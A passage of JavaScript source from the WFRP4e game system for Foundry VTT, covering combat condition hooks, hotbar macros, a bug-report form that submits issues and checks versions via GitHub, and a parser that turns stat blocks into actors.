            <a class="condition-script" data-combatant-id="${turn.id}" data-cond-id="${cond.conditionId}">${game.i18n.format("CONDITION.Apply", { condition: conditionName })}</a>`;
                await ChatMessage.create({ content: msgContent, speaker: { alias: turn.token.name } });
            }

            let conditions = turn.actor.effects.contents.filter(e => e.isCondition);
            for (let cond of conditions) {
                // I swear to god whoever thought it was a good idea for these conditions to reduce every *other* round...
                if (cond.conditionId == "deafened" || cond.conditionId == "blinded" && Number.isNumeric(cond.flags.wfrp4e.roundReceived)) {
                    if ((combat.round - 1) % 2 == cond.flags.wfrp4e.roundReceived % 2) {
                        await turn.actor.removeCondition(cond.conditionId);
                        removedConditions.push(
                            game.i18n.format("CHAT.RemovedConditions", {
                                condition: game.i18n.localize(game.wfrp4e.config.conditions[cond.conditionId]),
                                name: turn.actor.token?.name || turn.actor.prototypeToken.name
                            }));
                    }
                }
            }
        }
        if (removedConditions.length)
            await ChatMessage.create({ content: removedConditions.join("<br>") });
    }

    static async fearReminders(combat) {
        let chatData = { content: game.i18n.localize("CHAT.FearReminder") + "<br><br>", speaker: { alias: game.i18n.localize("CHAT.Fear") } };
        let fearedCombatants = combat.turns.filter(t => t.actor.hasCondition("fear"));
        if (!fearedCombatants.length)
            return

        fearedCombatants.forEach(c => {
            let fear = c.actor.hasCondition("fear");
            chatData.content += `<b>${c.name}</b>`;
            if (fear.flags.wfrp4e.fearName)
                chatData.content += ` (${fear.flags.wfrp4e.fearName})`;
            chatData.content += "<br>";
        });
        await ChatMessage.create(chatData);
    }

    static async clearCombatantAdvantage(combat) {
        if (!game.user.isUniqueGM)
            return

        if (game.settings.get("wfrp4e","useGroupAdvantage")) {
            await WFRP_Utility.updateGroupAdvantage({players : 0, enemies : 0});
        } 

        for (let turn of combat.turns) {
            await turn.actor.update({ "system.status.advantage.value": 0 }, {skipGroupAdvantage: true});
        }
    }
}

function combat() {
  Hooks.on("updateCombat", CombatHelpers.updateCombat);
  Hooks.on("updateCombat", CombatHelpers.updateCombatStart);
  Hooks.on("preUpdateCombat", CombatHelpers.preUpdateCombat);
  Hooks.on("deleteCombat", CombatHelpers.endCombat);


  Hooks.on("preCreateCombatant", (combatant, data) => {
    combatant.updateSource({img : WFRP_Utility.replacePopoutPath(combatant.token.texture.src)});
  });

  Hooks.on("createCombatant", combatant => {
    if (game.settings.get("wfrp4e", "useGroupAdvantage") && game.user.isGM) {
      let advantage = game.settings.get("wfrp4e", "groupAdvantageValues");
      combatant.actor.update({"system.status.advantage.value" : advantage[combatant.actor.advantageGroup]}, {fromGroupAdvantage : true});
    }
    let mask = combatant.token.hidden;
    if (mask && game.user.isGM) {
      let data = {};
      data.img = "systems/wfrp4e/tokens/unknown.png";
      data.name = "???";
      combatant.update(data);
    }
  });

  Hooks.on("updateToken", function(scene, tokenData, diffData, options, userId) {
    if (game.combat?.active && game.user.isGM) {
      let combatant = game.combat.turns.find(x => x.tokenId == tokenData._id);
      let token = game.canvas.tokens.getDocuments().find(x => x._id == tokenData._id);
      if(!token || !combatant) return;
      let mask = token.hidden;
      let data = null;
      if (combatant && mask && !combatant.hidden && combatant.name != "???") {
        data = {};
        data.img = "systems/wfrp4e/tokens/unknown.png";
        data.name = "???";
      }
      else if (combatant && !mask && !combatant.hidden && combatant.name == "???") {
        data = {};
        data.img = token.texture.src;
        data.name = token.name;
      }
      if (data) {
        combatant.update(data);
      }
    }
  });


  /* Custom Combat Carousel */
  Hooks.on('renderCombatCarousel', () => {
    addClassByQuerySelector("wfrp4e", "#combat-carousel");
    let carouselSize = game.settings.get('combat-carousel', 'carouselSize');
    if (carouselSize !== "") {
      addClassByQuerySelector(carouselSize, "#combat-carousel");
    }
  });
  
  function addClassByQuerySelector(className, selector) {
    let navigation = document.querySelector(selector);
    navigation.classList.add(className);
  }

  Hooks.on("renderCombatTracker", (app, html, options) => {
    WFRP_Utility.replacePopoutTokens(app.element); // Combat tracker shows tokens, replace popout versions with normal

    if (game.settings.get("wfrp4e", "useGroupAdvantage"))
    {
      let advantage = game.settings.get("wfrp4e", "groupAdvantageValues");
      let element = 
      $(`
      <div class="advantage-groups">
      <div class="advantage-group">
      <label>${game.i18n.localize("Players")}</label>
      <input data-group="players" type="number" value=${advantage.players}>
      </div>

      <div class="advantage-group">
      <label>${game.i18n.localize("Enemies")}</label>
      <input data-group="enemies" ${game.user.isGM ? "" : "disabled"} type="number" value=${advantage.enemies}>
      </div>
      </div>
      `);


      element.find("input").on("focus", ev => {
        ev.target.select();
      });

      element.find("input").on("change", async ev => {
        let group = ev.currentTarget.dataset.group;
        let value = Number(ev.currentTarget.value || 0);
        WFRP_Utility.updateGroupAdvantage({[`${group}`] : value});
      });

      element.insertAfter(html.find(".combat-tracker-header"));
    }
  });
}

function hotbarDrop () {
  // Needs to be syncrhonous to return false
  Hooks.on("hotbarDrop", (bar, data, slot) => {
    if (data.type == "Item" || data.type == "Actor") {
      handleMacroCreation(bar, data, slot);
      return false;
    }
  });
}

async function handleMacroCreation(bar, data, slot) {
  let document = await fromUuid(data.uuid);

  if (!document)
    return

  let macro;
  if (document.documentName == "Item") {
    if (document.type != "weapon" && document.type != "spell" && document.type != "prayer" && document.type != "trait" && document.type != "skill")
      return
    if (!document)
      return false;

    let command = `game.wfrp4e.utility.rollItemMacro("${document.name}", "${document.type}");`;
    macro = game.macros.contents.find(m => (m.name === document.name) && (m.command === command) && m.canExecute);
    if (!macro) {
      macro = await Macro.create({
        name: document.name,
        type: "script",
        img: document.img,
        command: command
      }, {displaySheet: false});
    }
  } else if (document.documentName == "Actor") {
    let command = `Hotbar.toggleDocumentSheet("${document.uuid}")`;
    macro = game.macros.contents.find(m => (m.name === document.name) && (m.command === command));
    if (!macro) {
      macro = await Macro.create({
        name: "Display " + document.name,
        type: "script",
        img: document.prototypeToken.texture.src,
        command: command
      }, {displaySheet: false});
    }
  }

  game.user.assignHotbarMacro(macro, slot);
}

function journal() {
  /**
   * Adds tooltips to journal sheet buttons and adds listeners for pseudo entities
   */
  Hooks.on("renderJournalPageSheet", (obj, html, data) => {
    $(html).find(".close").attr("title", game.i18n.localize("Close"));
    $(html).find(".entry-image").attr("title", game.i18n.localize("JOURNAL.ModeImage"));
    $(html).find(".entry-text").attr("title", game.i18n.localize("JOURNAL.ModeText"));
    $(html).find(".share-image").attr("title", game.i18n.localize("JOURNAL.ActionShow"));
    
    html.find(".secret.hook .reveal").remove(); // Remove button to reveal hooks, there isn't really a need for that and it messes up the css

    // ---- Listen for custom entity links -----
    html.find(".chat-roll").click(WFRP_Utility.handleRollClick.bind(WFRP_Utility));
    html.find(".symptom-tag").click(WFRP_Utility.handleSymptomClick.bind(WFRP_Utility));
    html.find(".condition-chat").click(WFRP_Utility.handleConditionClick.bind(WFRP_Utility));
    html.find(".property-chat").click(WFRP_Utility.handlePropertyClick.bind(WFRP_Utility));
    html.find('.table-click').mousedown(WFRP_Utility.handleTableClick.bind(WFRP_Utility));
    html.find('.pay-link').mousedown(WFRP_Utility.handlePayClick.bind(WFRP_Utility));
    html.find('.credit-link').mousedown(WFRP_Utility.handleCreditClick.bind(WFRP_Utility));
    html.find('.corruption-link').mousedown(WFRP_Utility.handleCorruptionClick.bind(WFRP_Utility));
    html.find('.fear-link').mousedown(WFRP_Utility.handleFearClick.bind(WFRP_Utility));
    html.find('.terror-link').mousedown(WFRP_Utility.handleTerrorClick.bind(WFRP_Utility));
    html.find('.exp-link').mousedown(WFRP_Utility.handleExpClick.bind(WFRP_Utility));

    WFRP_Utility.addLinkSources(html);

  });
}

class BugReportFormWfrp4e extends Application {

    
    static issues = []; // Keep issues in static to avoid API limit
    static apiLimitReached = false;

    constructor(app) {
        super(app);

        this.endpoint = "https://aa5qja71ih.execute-api.us-east-2.amazonaws.com/Prod/grievance";
        this.github = "https://api.github.com/repos/moo-man/WFRP4e-FoundryVTT/";

        this.domainKeysToLabel = {
            "wfrp4e": "system",
            "wfrp4e-core": "core",
            "wfrp4e-starter-set": "starter-set",
            "wfrp4e-rnhd": "rnhd",
            "wfrp4e-eis": "eis",
            "wfrp4e-ua1": "ua1",
            "wfrp4e-dotr": "dotr",
            "wfrp4e-middenheim": "middenheim",
            "wfrp4e-archives1": "archives1",
            "wfrp4e-pbtt": "pbtt",
            "wfrp4e-altdorf": "altdorf",
            "wfrp4e-ua2": "ua2",
            "wfrp4e-owb1": "owb1",
            "wfrp4e-horned-rat": "horned-rat",
            "wfrp4e-empire-ruins": "empire-ruins",
            "wfrp4e-archives2" : "archives2",
            "wfrp4e-up-in-arms" : "up-in-arms",
            "wfrp4e-wom" : "wom",
            "wfrp4e-zoo" : "zoo",
            "wfrp4e-salzenmund" : "salzenmund",
            "wfrp4e-owb2" : "owb2",
            "wfrp4e-soc" : "soc",
        };

        this.loadingIssues = this.loadIssues();
        this.latest = this.checkVersions();
    }

    static get defaultOptions() {
        const options = super.defaultOptions;
        options.id = "bug-report";
        options.template = "systems/wfrp4e/templates/apps/bug-report.hbs";
        options.classes.push("wfrp4e", "wfrp-bug-report");
        options.resizable = true;
        options.width = 600;
        options.minimizable = true;
        options.title = "Enter Your Grudge";
        options.tabs = [{ navSelector: ".tabs", contentSelector: ".content", initial: "submit" }];
        return options;
    }


    async _render(...args)
    {
        await super._render(...args);
        this.latest = await this.latest;
        this.element.find(".module-check").replaceWith(this.formatVersionWarnings());
    }

    async getData() {
        let data = await super.getData();
        await this.loadingIssues;
        data.domains = game.wfrp4e.config.premiumModules;
        data.name = game.settings.get("wfrp4e", "bugReportName");
        data.record = await this.buildRecord();
        if (this.constructor.apiLimitReached)
        {
            ui.notifications.error(game.i18n.localize("BUGREPORT.ApiLimitReached"), {permanent : true});
        }
        return data;
    }

    formatVersionWarnings() {

        if (!this.latest || this.latest instanceof Promise)
        {
            return "<div></div>"
        }


        let allUpdated = true;
        let outdatedList = "";

        for (let key in this.latest) {
            if (!this.latest[key]) {
                allUpdated = false;
                outdatedList += `<li>${game.wfrp4e.config.premiumModules[key]}</li>`;
            }
        }

        let element = `<div class='notification ${allUpdated ? "stable" : "warning"}'>`;

        if (allUpdated) {
            element += game.i18n.localize("BUGREPORT.Updated");
        }
        else {
            element += game.i18n.localize("BUGREPORT.NotUpdated");
            element += "<ul>";
            element += outdatedList;
            element += "</ul>";
        }

        element += "</div>";

        return element;
    }

    submit(data) {
        fetch(this.endpoint, {
            method: "POST",
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                title: data.title,
                body: data.description,
                assignees: ["moo-man"],
                labels: data.labels
            })
        })
            .then(res => {
                if (res.status == 201) {
                    ui.notifications.notify(game.i18n.localize("GrudgePost"));
                    res.json().then(json => {
                        console.log("%c%s%c%s", 'color: lightblue', `DAMMAZ KRON:`, 'color: unset', ` The longbeards hear you, thank you for your submission into the Dammaz Kron, these wrongs must be righted! If you wish to monitor or follow up with additional details like screenshots, you can find your issue here: ${json.html_url}.`);
                        this.recordIssue(json.number);
                    });
                }
                else {
                    ui.notifications.error(game.i18n.localize("GrudgePostError"));
                    console.error(res);
                }

            })
            .catch(err => {
                ui.notifications.error(game.i18n.localize("Something went wrong"));
                console.error(err);
            });
    }

    recordIssue(number)
    {
        let grudges = foundry.utils.deepClone(game.settings.get("wfrp4e", "grudges"));
        grudges.push(number);
        game.settings.set("wfrp4e", "grudges", grudges).then(() => {
            this.refreshIssues();
        });
    }


    async loadIssues() {
        WFRP_Utility.log("Loading GitHub Issues...");
        if (this.constructor.issues.length == 0)
        {

            for(let i = 1; i <= 10; i++)
            {
                SceneNavigation.displayProgressBar({label: game.i18n.localize("BUGREPORT.LoadingIssues"), pct: Math.round((i / 10) * 100) });

                this.constructor.issues = this.constructor.issues.concat((await fetch(this.github + `issues?per_page=100&page=${i}&state=all`)
                .then(r => r.json())
                .catch(error => {
                    if (error.status == 403)
                    {
                        this.constructor.apiLimitReached = true;
                    }
                    console.error(error);
                    this.constructor.issues = [];
                    return [];
                    
                })).map(this.trimIssue));
            }
        }
        else 
        {
            WFRP_Utility.log("Skipping requests, issues already loaded");
        }
        WFRP_Utility.log("Issues: ", undefined, this.constructor.issues);
        return this.constructor.issues;
    }

    // Issues are big objects, no need to keep everything, so just take what's needed
    trimIssue(issue)
    {
        return {
            number: issue.number,
            title : issue.title,
            html_url : issue.html_url,
            labels : issue.labels,
            state : issue.state
        }
    }

    async refreshIssues()
    {
        // Request a new page of issues, only keep issues we don't have
        let newIssues = (await fetch(this.github + `issues?per_page=100&state=all`).then(r => r.json()).catch(error => console.error(error))).map(this.trimIssue);
        this.constructor.issues = this.constructor.issues.concat(newIssues.filter(newIssue => !this.constructor.issues.find(i => i.number == newIssue.number)));
    }

    async buildRecord()
    {
        let numbersSubmitted = game.settings.get("wfrp4e", "grudges");

        let issuesSubmitted = this.constructor.issues.filter(i => numbersSubmitted.includes(i.number));

        let record = {
            open : issuesSubmitted.filter(i => i.state == "open"),
            closed : issuesSubmitted.filter(i => i.state == "closed"),
            alert : false
        };

        for(let issue of record.open)
        {
            if (issue.labels.find(l => l.name == "non-repro" || l.name == "needs-info"))
            {
                issue.alert = true;
                record.alert = true;
            }
        }

        return record
    }

    async checkVersions() {
        let latest = {};
        WFRP_Utility.log("Checking Version Numbers...");
        for (let key in game.wfrp4e.config.premiumModules) {
            if (key == game.system.id) {
                // Have to use release tag instead of manifest version because CORS doesn't allow downloading release asset for some reason
                let release = await fetch(this.github + "releases/latest").then(r => r.json()).catch(e => {
                    console.error("Could not fetch latest versions: " + e);
                    return latest;
                });
                latest[key] = !foundry.utils.isNewerVersion(release.tag_name, game.system.version);
            }
            else if (game.modules.get(key)) {
                let manifest = await fetch(`https://foundry-c7-manifests.s3.us-east-2.amazonaws.com/${key}/module.json`).then(r => r.json()).catch(e => {
                    console.error("Could not fetch latest versions: " + e);
                    return latest;
                });
                latest[key] = !foundry.utils.isNewerVersion(manifest.version, game.modules.get(key).version);
            }
            WFRP_Utility.log(key + ": " + latest[key]);
        }
        WFRP_Utility.log("Version Status:", undefined, latest);
        return latest;
    }

    matchIssues(text) {

        let issues = this.constructor.issues.filter(i => i.state == "open");

        let words = text.toLowerCase().split(" ");
        let percentages = new Array(issues.length).fill(0);


        issues.forEach((issue, issueIndex) => {
            let issueWords = (issue.title + " " + issue.body).toLowerCase().trim().split(" ");
            words.forEach((word) => {
                {
                    if (issueWords.includes(word))
                        percentages[issueIndex]++;
                }
            });
        });
        let matchingIssues = [];
        percentages = percentages.map(i => i/issues.length);
        percentages.forEach((p, i) => {
            if (p > 0)
                matchingIssues.push(issues[i]);
        });
        return matchingIssues;
    }

    showMatchingGrudges(element, issues)
    {
        if(!issues || issues?.length <= 0)
            element[0].style.display="none";
        else 
        {
            element[0].style.display="flex";
            let list = element.find(".grudge-list");
            list.children().remove();
            list.append(issues.map(i => `<div class="grudge"><a href="${i.html_url}">${i.title}</div>`));
        }
    }

    checkWarnings(text)
    {
        let publicityWarning = this.element.find(".publicity")[0];
        let discordNameWarning = this.element.find(".discord")[0];
        publicityWarning.style.display = text.includes("@") ? "block" : "none";
        discordNameWarning.style.display = text.includes("#") ? "block" : "none";
    }

    activateListeners(html) {


        let modulesWarning = html.find(".active-modules")[0];
        let title = html.find(".bug-title")[0];
        let description = html.find(".bug-description")[0];
        let matching = html.find(".matching");
        let issuer = html.find(".issuer")[0];

        this.checkWarnings(issuer.value);

        html.find(".issuer").keyup(ev => {
            this.checkWarnings(ev.target.value);
        });

        html.find(".issue-label").change(ev => {
            if (ev.currentTarget.value == "bug") {
                if (game.modules.contents.filter(i => i.active).map(i => i.id).filter(i => !game.wfrp4e.config.premiumModules[i]).length > 0)
                    modulesWarning.style.display = "block";
                else
                    modulesWarning.style.display = "none";
            }
            else
                modulesWarning.style.display = "none";
        });

        html.find(".bug-title, .bug-description").keyup(async ev => {
            let text = title.value + " " + description.value;
            text = text.trim();
            if (text.length > 2) {
                this.showMatchingGrudges(matching, this.matchIssues(text));
            }
        });

        html.find(".bug-submit").click(ev => {
            let data = {};
            let form = $(ev.currentTarget).parents(".bug-report")[0];
            data.domain = $(form).find(".domain")[0].value;
            data.title = $(form).find(".bug-title")[0].value;
            data.description = $(form).find(".bug-description")[0].value;
            data.issuer = $(form).find(".issuer")[0].value;
            let label = $(form).find(".issue-label")[0].value;


            if (!data.domain || !data.title || !data.description)
                return ui.notifications.error(game.i18n.localize("BugReport.ErrorForm"))
            if (!data.issuer)
                return ui.notifications.error(game.i18n.localize("BugReport.ErrorName1"))


            data.title = `[${game.wfrp4e.config.premiumModules[data.domain]}] ${data.title}`;
            data.description = data.description + `<br/>**From**: ${data.issuer}`;

            data.labels = [this.domainKeysToLabel[data.domain]];

            if (label)
                data.labels.push(label);

            game.settings.set("wfrp4e", "bugReportName", data.issuer);

            let wfrp4eModules = Array.from(game.modules).filter(m => game.wfrp4e.config.premiumModules[m.id]);

            let versions = `<br/>foundry: ${game.version}<br/>wfrp4e: ${game.system.version}`;

            for (let mod of wfrp4eModules) {
                let modData = game.modules.get(mod.id);
                if (modData.active)
                    versions = versions.concat(`<br/>${mod.id}: ${modData.version}`);
            }

            data.description = data.description.concat(versions);
            data.description += `<br/>Active Modules: ${game.modules.contents.filter(i => i.active).map(i => i.id).filter(i => !game.wfrp4e.config.premiumModules[i]).join(", ")}`;

            this.submit(data);
            this.close();
        });
    }
}

function sidebar() {
  Hooks.on("renderSidebarTab", async (app, html) => {


    // WFRP styling makes popout sidebars really narrow because of the border so expand it
    if (app.options.id == "chat" && app.options.popOut)
    {
      html[0].style.width = "390px";
    }


    if (app.options.id == "settings")
    {
      let button = $(`<button class='bug-report'>${game.i18n.localize("BUTTON.PostBug")}</button>`);
  
      button.click(ev => {
        new BugReportFormWfrp4e().render(true);
      });
  
      button.insertAfter(html.find("#game-details"));
      
    }

    if (app instanceof RollTableDirectory)
    {

      // Auto-roll tables if table image is clicked
      html.on("click", ".rolltable img", ev => {
        let table = game.tables.get($(ev.currentTarget).parent().attr("data-document-id"));
        let key = table.getFlag("wfrp4e", "key");
        let column = table.getFlag("wfrp4e", "column");

        if (!key)
          return
        
        game.wfrp4e.tables.formatChatRoll(key, {}, column).then(text => {
          let chatOptions = game.wfrp4e.utility.chatDataSetup(text, game.settings.get("core", "rollMode"), true);
          chatOptions.speaker = {alias: table.name};
          ChatMessage.create(chatOptions);
          ui.sidebar.activateTab("chat");
        });
      });
    }


    if (app instanceof ActorDirectory)
    {
      let button = $(`<button class='character-creation'>${game.i18n.localize("BUTTON.CharacterCreation")}</button>`);
  
      button.click(ev => {
        CharGenWfrp4e.start();
      });
  
      button.insertAfter(html.find(".header-actions"));
      
    }
  });
}

function rolltable() {
    Hooks.on("preCreateTableResult", (result, data) => {
        if (!data.img)
            result.updateSource({"img" : "icons/svg/d10-grey.svg"});
    });

    Hooks.on("preCreateRollTable", (table, data) => {
        if (!data.img)
            table.updateSource({"img" : "systems/wfrp4e/ui/buttons/d10.webp"});
    });
}

class StatBlockParser extends FormApplication {
    static get defaultOptions() {
        const options = super.defaultOptions;
        options.id = "stat-parser";
        options.template = "systems/wfrp4e/templates/apps/stat-parser.hbs";
        options.height = 600;
        options.width = 600;
        options.minimizable = true;
        options.title = "Stat Block Parser";
        return options;
    }

    getData() {

        let types = game.system.template.Actor.types;
        return { types }
    }


    async _updateObject(event, formData) {
        let {name, type, data, items} = await StatBlockParser.parseStatBlock(formData.statBlock, this.object.type);
        await this.object.update({name, type, data});
        await this.object.createEmbeddedDocuments("Item", items);
    }

    static async parseStatBlock(statString, type = "npc") {
        let model = foundry.utils.duplicate(game.system.model.Actor[type]);

        let blockArray = statString.split("\n");
        let name = blockArray[0].split("—")[0].split(" ").filter(f => !!f);

        name = name.map(word => {
            if (word == "VON")
                return word.toLowerCase();

            word = word.toLowerCase();
            word = word[0].toUpperCase() + word.substring(1, word.length);
            return word;
        });
        name = name.join(" ");

        let status  = -1;
        if (blockArray[0].includes("("))
            status = blockArray[0];
        else if (blockArray[1].includes("("))
            status = blockArray[1];
        
        if (status != -1 && foundry.utils.hasProperty(model, "details.status.value"))
        {
            status = status.substring(status.indexOf("(")+1, status.indexOf(")"));
            model.details.status.value = status[0] + status.slice(1).toLowerCase();
        }

        let tableIndex = blockArray.findIndex(v => v.includes(" WS "));
        let characteristicNames = blockArray[tableIndex].split(" ");
        let characteristicValues = blockArray[tableIndex + 1].split(" ");

        for (let i = 0; i < characteristicNames.length; i++) {
            if (characteristicNames[i] == "Agi")
                characteristicNames[i] = "Ag";
            if (characteristicNames[i].toLowerCase() == "m") {
                model.details.move.value = Number(characteristicValues[i]);
                continue;
            }
            if (characteristicNames[i].toLowerCase() == "w")
                continue;

            try {
                model.characteristics[characteristicNames[i].toLowerCase()].initial = Number(characteristicValues[i]);
            }
            catch { }
        }


        let skillRegex = /([a-zA-Z\s]+?)(?:\((.+?)\)|)\s?(\d{1,3}|)(?:,|$)/gm;
        let talentRegex = /(?:,?(.+?)(\d{1,2})?(?:\((.+?)\)\s*(\d{1,2})?|,|$))/gm;
        let traitRegex = /(?:,?(.+?)(\+?\d{1,2}\+?)?\s*?(?:\((.+?)\)\s*(\+?\d{1,2})?|,|$))/gm;

        let skillBlockIndexStart = blockArray.findIndex(v => v.split(" ")[0].includes(game.i18n.localize("Skills")));
        let talentBlockIndexStart = blockArray.findIndex(v => v.split(" ")[0].includes(game.i18n.localize("Talents")));
        let traitBlockIndexStart = blockArray.findIndex(v => v.split(" ")[0].includes(game.i18n.localize("Traits")));
        let trappingBlockIndexStart = blockArray.findIndex(v => v.split(" ")[0].includes(game.i18n.localize("Trappings")) || v.split(" ")[0].includes(game.i18n.localize("Possessions")));


        let skillBlockIndex = skillBlockIndexStart;
        let talentBlockIndex = talentBlockIndexStart;
        let traitBlockIndex = traitBlockIndexStart;
        let trappingBlockIndex = trappingBlockIndexStart;

        let skillBlock = blockArray[skillBlockIndex] || "";
        let talentBlock = blockArray[talentBlockIndex] || "";
        let traitBlock = blockArray[traitBlockIndex] || "";
        let trappingBlock = blockArray[trappingBlockIndex] || "";

        while (skillBlockIndex >= 0) {
            skillBlockIndex++;
            if (skillBlockIndex == talentBlockIndexStart || skillBlockIndex == traitBlockIndexStart || skillBlockIndex == trappingBlockIndexStart || skillBlockIndex >= blockArray.length)
                break;

            skillBlock = skillBlock.concat(" " + blockArray[skillBlockIndex]);
        }
        while (talentBlockIndex >= 0) {
            talentBlockIndex++;
            if (talentBlockIndex == skillBlockIndexStart || talentBlockIndex == traitBlockIndexStart || talentBlockIndex == trappingBlockIndexStart || talentBlockIndex >= blockArray.length)
                break;

            talentBlock = talentBlock.concat(" " + blockArray[talentBlockIndex]);
        }
        while (traitBlockIndex >= 0) {
            traitBlockIndex++;
            if (traitBlockIndex == skillBlockIndexStart || traitBlockIndex == talentBlockIndexStart || traitBlockIndex == trappingBlockIndexStart || traitBlockIndex >= blockArray.length)
                break;

            traitBlock = traitBlock.concat(" " + blockArray[traitBlockIndex]);
        }
        while (trappingBlockIndex >= 0) {
            trappingBlockIndex++;
            if (trappingBlockIndex == skillBlockIndexStart || trappingBlockIndex == talentBlockIndexStart || trappingBlockIndex == traitBlockIndexStart || trappingBlockIndex >= blockArray.length)
                break;

            trappingBlock = trappingBlock.concat(" " + blockArray[trappingBlockIndex]);
        }



        let skillStrings = skillBlock.substring(skillBlock.indexOf(":")+1);
        let talentStrings = talentBlock.substring(talentBlock.indexOf(":")+1);
        let traitStrings = traitBlock.substring(traitBlock.indexOf(":")+1);
        let trappingStrings = trappingBlock.substring(trappingBlock.indexOf(":")+1);


        let skillMatches = skillStrings.matchAll(skillRegex);
        let talentMatches = talentStrings.matchAll(talentRegex);
        let traitMatches = traitStrings.matchAll(traitRegex);
        //let trappingMatches = skillStrings.matchAll(trappingRegex)


        let skills = [];
        let talents = [];
        let traits = [];
        let trappings = [];


        for (let match of skillMatches){

            /**
             * 3 Cases
             * 1. Intution 67
             * 2. Language (Magick) 52
             * 3. Melee (Basic 56, Polearm 62, ...)
             */

            let skillName = match[1]; // Name of the skill, should always exist
            let skillGroup = match[2]; // either null (case 1), a word(s) (case 2) or a group of words-values pairs (case 3)
            let skillValue = match[3];  // Either null (case 3) or a value (case 1 and 2)

            let skillSearches = [];
            let skillItems = [];

            // Case 3
            if (!Number.isNumeric(skillValue))
            {
                let innerMatches = skillGroup.matchAll(skillRegex); // rerun regex on inner group
                for (let inner of innerMatches)
                {
                    skillSearches.push({name : skillName, group : inner[1], value : inner[3]});
                }
            }
            else // case 1 and 2
            {
                skillSearches.push({name : skillName, group : skillGroup, value : skillValue});
            }

            skillSearches.forEach(s => {
                s.name = s.name?.trim();
                s.group = s.group?.trim();
                s.value = s.value?.trim();
            });


            for(let search of skillSearches)
            {
                let skillItem;
                try {skillItem = await WFRP_Utility.findSkill(`${search.name} ${search.group ? "(" + search.group + ")" : ""}`.trim());}
                catch {}
                if (!skillItem) {
                    console.error("Could not find " + search.name);
                    ui.notifications.error(game.i18n.format("ERROR.Parser", {name: search.name}), { permanent: true });
                    continue
                }
                else skillItem = skillItem.toObject();

                skillItem.system.advances.value = Number(search.value) - model.characteristics[skillItem.system.characteristic.value].initial;

                skillItems.push(skillItem);

            }
            skills = skills.concat(skillItems);
        }
        
        for (let match of talentMatches){

            let talentName = match[1].trim();
            let talentAdvances = parseInt(match[2] || match[4]); // could be match 2 or 4 depending on if there's a specialization
            let talentSpec = match[3]?.trim();

            let talentItem;
            try { talentItem = await WFRP_Utility.findTalent(talentName); }
            catch { }

            if (!talentItem) {
                console.error("Could not find " + talentName);
                ui.notifications.error(game.i18n.format("ERROR.Parser", {name: talentName}), { permanent: true });
                continue
            }
            talentItem = talentItem.toObject();

            if (talentName == game.i18n.localize("NAME.Doomed"))
            {
                talentItem.system.description.value += `<br><br><em>${talentSpec}</em>`;
            }
            else if (talentName == game.i18n.localize("NAME.Etiquette"))
            {
                talentItem.system.tests.value = talentItem.system.tests.value.replace(game.i18n.localize("Social Group"), match[3]);
                talentItem.name += ` (${talentSpec})`;
            }
            else if (talentName == game.i18n.localize("NAME.Resistance"))
            {
                talentItem.system.tests.value = talentItem.system.tests.value.replace(game.i18n.localize("the associated Threat"), match[3]);
                talentItem.name += ` (${talentSpec})`;
            }
            else if (talentName == game.i18n.localize("NAME.AcuteSense"))
            {
                talentItem.system.tests.value = talentItem.system.tests.value.replace(game.i18n.localize("Sense"), match[3]);
                talentItem.name += ` (${talentSpec})`;
            }
            else if (talentName == game.i18n.localize("NAME.Strider"))
            {
                talentItem.system.tests.value = talentItem.system.tests.value.replace(game.i18n.localize("the Terrain"), match[3]);
                talentItem.name += ` (${talentSpec})`;
            }
            else if (talentName == game.i18n.localize("NAME.Savant"))
            {
                talentItem.system.tests.value = talentItem.system.tests.value.replace(game.i18n.localize("chosen Lore"), match[3]);
                talentItem.name += ` (${talentSpec})`;
            }
            else if (talentName == "Craftsman")
            {
                talentItem.system.tests.value = talentItem.system.tests.value.replace("any one", match[3]);
                talentItem.name += ` (${talentSpec})`;
            }
            else if (talentSpec)
                talentItem.name += ` (${talentSpec})`;

            talentItem.system.advances.value = 1;

            if (Number.isNumeric(talentAdvances))
            {
                for (let i = 1; i < talentAdvances; i++)
                    talents.push(talentItem);

            }
            talents.push(talentItem);
        }

        for (let match of traitMatches) {

            let traitName = match[1];
            let traitVal = match[2] || match[4]; // could be match 2 or 4 depending on if there's a specialization
            let traitSpec = match[3];


            let traitItem;
            try {
                traitItem = await WFRP_Utility.findItem(traitName, "trait");
            }
            catch { }
            if (!traitItem) {
                console.error("Could not find " + traitName);
                ui.notifications.error(game.i18n.format("ERROR.Parser", {name: traitName}), { permanent: true });
                continue
            }
            traitItem = traitItem.toObject();

            if (Number.isNumeric(traitVal))
            {
                traitItem.system.specification.value = traitName.includes('Weapon','Horns','Tail','Tentacles','Bite') ? traitVal - parseInt(characteristicValues[3]/10) : traitVal;
                traitItem.name = (traitItem.name +  ` ${traitSpec ? "("+ traitSpec + ")" : ""}`).trim();
            }
            else 
                traitItem.system.specification.value = traitSpec;

            traits.push(traitItem);
        }

        if (trappingStrings)
        {
            for (let trapping of trappingStrings.split(",")) {
    
                let trappingItem = await WFRP_Utility.findItem(trapping, game.wfrp4e.config.trappingItems);
                if (!trappingItem) {
                    trappingItem = new ItemWfrp4e({ img: "systems/wfrp4e/icons/blank.png", name: trapping, type: "trapping", data: game.system.model.Item.trapping });
                    trappingItem.updateSource({"trappingType.value" : "misc"});
                }
                trappings.push(trappingItem.toObject());
            }
        }

        let moneyItems = await WFRP_Utility.allMoneyItems() || [];
        // moneyItems = moneyItems.map(i => i.toObject())
        moneyItems = moneyItems.sort((a, b) => (a.system.coinValue > b.system.coinValue) ? -1 : 1);
        moneyItems.forEach(m => m.system.quantity.value = 0);

        skills.forEach(t => {
            delete t._id;
        });

        trappings.forEach(t => {
            delete t._id;
        });
        
        talents.forEach(t => {
            delete t._id;
        });
        traits.forEach(t => {
            delete t._id;
        });
        let effects = trappings.reduce((total, trapping) => total.concat(trapping.effects), []).concat(talents.reduce((total, talent) => total.concat(talent.effects), [])).concat(traits.reduce((total, trait) => total.concat(trait.effects), []));
        effects = effects.filter(e => !!e);
        effects = effects.filter(e => e.transfer);
    
        effects.forEach(e => {
            let charChanges = e.changes.filter(c => c.key.includes("characteristics"));
            for(let change of charChanges)
            {
                let split = change.key.split(".");
                let target = split.slice(1).join(".");
                foundry.utils.setProperty(model, target, (getProperty(model, target) + (-1 * change.value))); // Counteract effect changes
            }
        });

        return { name, type, data: model, items: skills.concat(talents).concat(traits).concat(trappings).concat(moneyItems), effects }

    }

}

function entryContext () {

  /**
   * Add right click option to actors to add all basic skills
   */
  Hooks.on("getActorDirectoryEntryContext", async (html, options) => {
    options.push(
      {
